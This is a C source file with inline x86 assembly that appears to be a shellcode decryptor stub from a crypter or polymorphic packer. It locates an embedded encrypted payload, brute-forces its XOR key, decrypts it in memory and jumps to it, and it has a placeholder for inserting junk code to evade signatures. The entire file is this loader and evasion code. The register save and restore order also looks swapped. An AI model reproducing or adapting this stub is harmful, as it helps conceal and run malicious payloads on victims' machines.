#include <Windows.h>

__declspec(naked) int decryptor_main(void)
{
	__asm
	{
		push ebp
		push ebx
		mov ebp, esp
		//%junk%
		sub esp, 0x20

		mov ecx, 0xDEADBEEF // end_proc magic

		call get_eip
		mov [esp], eax

		mov ebx, [esp]
scan_end_proc:
		inc ebx
		cmp [ebx], ecx
		jne scan_end_proc

		mov ecx, [ebx + 4]
		mov [esp + 4], ecx

		mov ecx, [ebx + 8]
		mov [esp + 8], ecx

		add ebx, 12
		mov [esp + 12], ebx

		// esp+4 size_of_shell
		// esp+8 check_bytes
		// esp+12 ptr to shell

		xor ebx, ebx // set test key to zero
brute_key:
		mov edx, [esp + 12]
		mov edx, [edx]
		xor edx, ebx
		cmp edx, [esp + 8]
		je done_brute_key
		inc ebx
		jmp brute_key
done_brute_key:
		mov [esp + 16], ebx // good key esp+16

		nop
		nop
		nop
		// ebx still contains good key
		mov edx, [esp + 12]
		xor ecx, ecx // counter to zero
dec_shell:
		xor [edx + ecx], ebx
		cmp ecx, [esp + 4]
		jge done_dec_shell
		add ecx, 4
		jmp dec_shell
done_dec_shell:

		mov esp, ebp
		pop ebp
		pop ebx
		
		jmp edx

get_eip:
		mov eax, [esp]
		ret

		_emit(0xEF)
		_emit(0xBE)
		_emit(0xAD)
		_emit(0xDE)
		// dd size_of_shell
		// dd check_bytes
	}
}